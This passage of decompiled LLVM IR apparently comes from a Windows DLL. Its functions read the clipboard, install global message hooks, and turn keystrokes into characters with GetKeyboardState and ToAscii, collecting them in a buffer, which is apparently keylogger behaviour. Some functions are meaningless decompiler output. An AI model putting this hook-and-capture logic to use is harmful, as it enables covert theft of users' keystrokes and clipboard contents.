  %47 = load i8, i8* %46, align 2, !insn.addr !568
  %48 = mul i8 %47, 2, !insn.addr !568
  store i8 %48, i8* %46, align 2, !insn.addr !568
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !569
  %50 = icmp eq i32* %49, null, !insn.addr !570
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !571

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !569
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !572
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !573
  %53 = icmp eq i32* %52, null, !insn.addr !574
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !575

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !576
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !577
  br label %dec_label_pc_404f04, !insn.addr !577

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !578
  br label %dec_label_pc_404f09, !insn.addr !578

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !579
  %57 = sext i1 %56 to i32, !insn.addr !579
  store i32 %57, i32* %.reg2mem, !insn.addr !580
  br label %dec_label_pc_404f0f, !insn.addr !580

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !581
  ret i32 %.reload, !insn.addr !581
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !582
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !582
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !583
  %4 = inttoptr i32 %3 to i32*, !insn.addr !584
  %5 = load i32, i32* %4, align 4, !insn.addr !584
  %6 = icmp eq i32 %5, 0, !insn.addr !584
  %7 = icmp eq i1 %6, false, !insn.addr !585
  %8 = icmp eq i1 %7, false, !insn.addr !586
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !586

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !587
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !588
  %11 = icmp eq i32* %10, null, !insn.addr !589
  %12 = icmp eq i1 %11, false, !insn.addr !590
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !590

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220780 to i32*), i32 0, i32* null), !insn.addr !591
  br label %dec_label_pc_404f50, !insn.addr !591

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !592
  store i32 0, i32* %15, align 4, !insn.addr !592
  ret i32 -2147221231, !insn.addr !593
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !594
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !595
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !596
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !597
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !597
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !597
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !598
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !599
  %3 = add i32 %2, 1, !insn.addr !599
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !599
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !600
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !601
  ret i32 0, !insn.addr !602
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !603
  ret i32 %0, !insn.addr !603
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !604
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !605
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !606
  %2 = add i32 %1, -1, !insn.addr !606
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !606
  ret i32 %0, !insn.addr !607
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !608
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !609
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !609
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !609
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !610
  %4 = call i32 @function_407250(), !insn.addr !611
  %5 = icmp ne i32 %4, 0, !insn.addr !612
  %6 = icmp eq i1 %5, false, !insn.addr !613
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !614
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !614

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_4072ec(), !insn.addr !615
  %8 = call i32 @"@LStrDelete"(), !insn.addr !616
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !617
  br label %dec_label_pc_4050bb, !insn.addr !617

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_4072ec(), !insn.addr !618
  %10 = call i32 @"@LStrDelete"(), !insn.addr !619
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !620
  br label %dec_label_pc_4050bb, !insn.addr !620

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !621
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !622
  %14 = udiv i32 %1, 65536, !insn.addr !623
  %15 = and i32 %14, 255, !insn.addr !624
  %16 = inttoptr i32 %15 to i16*, !insn.addr !625
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !626
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !627
  %19 = icmp eq i32 %18, 1, !insn.addr !628
  %20 = icmp eq i1 %19, false, !insn.addr !629
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !629
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !629

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406fb4(), !insn.addr !630
  %22 = icmp eq i32 %21, 0, !insn.addr !631
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !632
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !632

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !633
  %24 = icmp sgt i32 %23, 15, !insn.addr !634
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !634
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !634

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_4072ec(), !insn.addr !635
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !636
  %27 = call i32 @"@LStrInsert"(), !insn.addr !637
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !637
  br label %dec_label_pc_4050bb, !insn.addr !637

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !638
  %29 = load i32, i32* %28, align 4, !insn.addr !638
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !639
  %30 = add i32 %esp.0.reload, 8, !insn.addr !640
  %31 = inttoptr i32 %30 to i32*, !insn.addr !640
  store i32 4215003, i32* %31, align 4, !insn.addr !640
  %32 = call i32 @"@LStrClr"(), !insn.addr !641
  ret i32 %32, !insn.addr !642
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !643
  ret i32 %0, !insn.addr !643
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !644
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !645
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !646
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !646
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !646
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !647
  %2 = call i32 @function_407250(), !insn.addr !648
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !649
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !650
  %4 = add i32 %1, 8, !insn.addr !651
  %5 = inttoptr i32 %4 to i32*, !insn.addr !651
  store i32 4215210, i32* %5, align 4, !insn.addr !651
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !652
  ret i32 %6, !insn.addr !653
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !654
  ret i32 %0, !insn.addr !654
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !655
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !656
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !657
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !658
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !658
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !658
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !659
  %3 = call i32 @function_4071c0(), !insn.addr !660
  %4 = icmp eq i32 %3, 0, !insn.addr !661
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !662
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !662

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !663
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !664
  %7 = ptrtoint i32* %6 to i32, !insn.addr !664
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !665
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !665
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !666
  %10 = icmp eq i1 %9, false, !insn.addr !667
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !668

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_407020(), !insn.addr !669
  %12 = call i32 @"@LStrAsg"(), !insn.addr !670
  %13 = call i32 @function_407348(), !insn.addr !671
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !672
  br label %dec_label_pc_405214, !insn.addr !672

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_40747c(), !insn.addr !673
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !673
  br label %dec_label_pc_405214, !insn.addr !673

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !674
  %16 = load i32, i32* %15, align 4, !insn.addr !674
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !675
  %17 = add i32 %esp.0.reload, 8, !insn.addr !676
  %18 = inttoptr i32 %17 to i32*, !insn.addr !676
  store i32 4215345, i32* %18, align 4, !insn.addr !676
  %19 = call i32 @"@LStrClr"(), !insn.addr !677
  ret i32 %19, !insn.addr !678
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !679
  ret i32 %0, !insn.addr !679
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !680
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !681
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !682
  %8 = inttoptr i32 %4 to i8*, !insn.addr !682
  store i8 %7, i8* %8, align 1, !insn.addr !682
  %9 = add i32 %2, 111, !insn.addr !683
  %10 = inttoptr i32 %9 to i8*, !insn.addr !683
  %11 = load i8, i8* %10, align 1, !insn.addr !683
  %12 = load i32, i32* %eax, align 4, !insn.addr !683
  %13 = trunc i32 %12 to i8, !insn.addr !683
  %14 = add i8 %11, %13, !insn.addr !683
  store i8 %14, i8* %10, align 1, !insn.addr !683
  %15 = trunc i32 %3 to i16, !insn.addr !684
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !684
  %17 = inttoptr i32 %0 to i32*, !insn.addr !684
  store i32 %16, i32* %17, align 4, !insn.addr !684
  %18 = add i32 %0, 66, !insn.addr !685
  %19 = inttoptr i32 %18 to i64*, !insn.addr !685
  %20 = load i64, i64* %19, align 4, !insn.addr !685
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !685
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !686
  %22 = load i8, i8* %5, align 4, !insn.addr !687
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !687
  %25 = add i8 %22, %24, !insn.addr !687
  %26 = inttoptr i32 %23 to i8*, !insn.addr !687
  store i8 %25, i8* %26, align 1, !insn.addr !687
  %27 = add i32 %21, -117, !insn.addr !688
  %28 = inttoptr i32 %27 to i8*, !insn.addr !688
  %29 = load i8, i8* %28, align 1, !insn.addr !688
  %30 = trunc i32 %3 to i8, !insn.addr !688
  %31 = add i8 %29, %30, !insn.addr !688
  store i8 %31, i8* %28, align 1, !insn.addr !688
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !689
  %33 = add i32 %21, 16, !insn.addr !690
  %34 = inttoptr i32 %33 to i32*, !insn.addr !690
  %35 = load i32, i32* %34, align 4, !insn.addr !690
  %36 = add i32 %21, 12, !insn.addr !691
  %37 = inttoptr i32 %36 to i32*, !insn.addr !691
  %38 = load i32, i32* %37, align 4, !insn.addr !691
  %39 = add i32 %21, 8, !insn.addr !692
  %40 = inttoptr i32 %39 to i32*, !insn.addr !692
  %41 = load i32, i32* %40, align 4, !insn.addr !692
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !693
  %43 = inttoptr i32 %42 to i32*, !insn.addr !694
  %44 = load i32, i32* %43, align 4, !insn.addr !694
  %45 = icmp eq i32 %44, 0, !insn.addr !694
  %46 = icmp eq i1 %45, false, !insn.addr !695
  %47 = icmp eq i32 %41, 0, !insn.addr !696
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !697
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !698

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !699
  %51 = add i32 %35, 4, !insn.addr !700
  %52 = inttoptr i32 %51 to i32*, !insn.addr !700
  %53 = load i32, i32* %52, align 4, !insn.addr !700
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !701
  br label %dec_label_pc_40529a, !insn.addr !702

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !703
  br label %dec_label_pc_40529a, !insn.addr !703

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !704
  %57 = inttoptr i32 %35 to i32*, !insn.addr !705
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !705
  ret i32 %58, !insn.addr !706
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !707
  %5 = icmp eq i1 %4, false, !insn.addr !708
  %6 = icmp eq i32 %arg3, 0, !insn.addr !709
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !710

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !711
  %9 = inttoptr i32 %8 to i32*, !insn.addr !711
  %10 = load i32, i32* %9, align 4, !insn.addr !711
  %11 = icmp eq i32 %10, 2, !insn.addr !712
  %12 = icmp eq i1 %11, false, !insn.addr !713
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !713

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !714
  br label %dec_label_pc_4052e0, !insn.addr !714

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !715
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !716
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !716
  ret i32 %16, !insn.addr !717
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !718
  %2 = ptrtoint i32* %1 to i32, !insn.addr !718
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !719
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !720
  %5 = ptrtoint i32* %4 to i32, !insn.addr !720
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !721
  ret i32 %5, !insn.addr !722
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !723
  %1 = inttoptr i32 %0 to i32*, !insn.addr !724
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !724
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !725
  %4 = inttoptr i32 %3 to i32*, !insn.addr !726
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !726
  %6 = sext i1 %5 to i32, !insn.addr !726
  ret i32 %6, !insn.addr !727
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !728
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !728
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !728
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !729
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !730
  %3 = add i32 %2, 1, !insn.addr !730
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !730
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !731
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !732
  ret i32 0, !insn.addr !733
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !734
  ret i32 %0, !insn.addr !734
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !735
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !736
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !737
  %2 = add i32 %1, -1, !insn.addr !737
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !737
  ret i32 %0, !insn.addr !738
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !739
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !739
  %5 = inttoptr i32 %3 to i32*, !insn.addr !739
  store i32 %4, i32* %5, align 4, !insn.addr !739
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !740
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !740
  %10 = add i8 %7, %9, !insn.addr !740
  %11 = inttoptr i32 %8 to i8*, !insn.addr !740
  store i8 %10, i8* %11, align 1, !insn.addr !740
  %12 = load i32, i32* %eax, align 4, !insn.addr !741
  store i32 %arg1, i32* %eax, align 4, !insn.addr !742
  %13 = add i32 %12, 99, !insn.addr !743
  %14 = inttoptr i32 %13 to i64*, !insn.addr !743
  %15 = load i64, i64* %14, align 4, !insn.addr !743
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !743
  %17 = add i32 %16, -2, !insn.addr !744
  %18 = inttoptr i32 %17 to i16*, !insn.addr !744
  store i16 27241, i16* %18, align 2, !insn.addr !744
  %19 = mul i32 %2, 2, !insn.addr !745
  %20 = add i32 %2, 110, !insn.addr !745
  %21 = add i32 %20, %19, !insn.addr !745
  %22 = inttoptr i32 %21 to i32*, !insn.addr !745
  %23 = load i32, i32* %22, align 4, !insn.addr !745
  %24 = sext i32 %23 to i64, !insn.addr !745
  %25 = mul nsw i64 %24, 111, !insn.addr !745
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !745
  %28 = icmp eq i64 %25, %27, !insn.addr !745
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !746

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !747
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !748

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !747
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !749

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !747
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !494, !insn.addr !747
  %33 = and i8 %32, 1, !insn.addr !747
  %34 = icmp eq i8 %33, 0, !insn.addr !747
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !750

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !741
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !751
  %37 = load i32, i32* %36, align 4, !insn.addr !751
  %38 = xor i32 %37, %1, !insn.addr !751
  store i32 %38, i32* %36, align 4, !insn.addr !751
  %39 = add i32 %1, 959985462, !insn.addr !752
  %40 = inttoptr i32 %39 to i32*, !insn.addr !752
  %41 = load i32, i32* %40, align 4, !insn.addr !752
  %42 = xor i32 %41, %1, !insn.addr !752
  %43 = add i32 %16, -38, !insn.addr !753
  %44 = inttoptr i32 %43 to i32*, !insn.addr !753
  store i32 %35, i32* %44, align 4, !insn.addr !753
  %45 = add i32 %16, -42, !insn.addr !754
  %46 = inttoptr i32 %45 to i32*, !insn.addr !754
  store i32 %42, i32* %46, align 4, !insn.addr !754
  %47 = add i32 %16, -22, !insn.addr !755
  %48 = inttoptr i32 %47 to i32*, !insn.addr !755
  store i32 0, i32* %48, align 4, !insn.addr !755
  %49 = add i32 %16, -26, !insn.addr !756
  %50 = inttoptr i32 %49 to i32*, !insn.addr !756
  store i32 0, i32* %50, align 4, !insn.addr !756
  %51 = add i32 %16, -30, !insn.addr !757
  %52 = inttoptr i32 %51 to i32*, !insn.addr !757
  store i32 0, i32* %52, align 4, !insn.addr !757
  %53 = add i32 %16, -34, !insn.addr !758
  %54 = inttoptr i32 %53 to i32*, !insn.addr !758
  store i32 0, i32* %54, align 4, !insn.addr !758
  %55 = add i32 %16, -6, !insn.addr !759
  %56 = inttoptr i32 %55 to i32*, !insn.addr !759
  store i32 %arg3, i32* %56, align 4, !insn.addr !759
  %57 = add i32 %16, -46, !insn.addr !760
  %58 = inttoptr i32 %57 to i32*, !insn.addr !760
  store i32 %17, i32* %58, align 4, !insn.addr !760
  ret i32 0, !insn.addr !760

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !761
  %60 = trunc i64 %25 to i32, !insn.addr !745
  %61 = load i32, i32* %eax, align 4, !insn.addr !762
  %62 = add i32 %61, 1, !insn.addr !762
  %63 = mul i32 %59, 8, !insn.addr !763
  %64 = add i32 %59, 48, !insn.addr !763
  %65 = add i32 %64, %63, !insn.addr !763
  %66 = inttoptr i32 %65 to i8*, !insn.addr !763
  %67 = load i8, i8* %66, align 4, !insn.addr !763
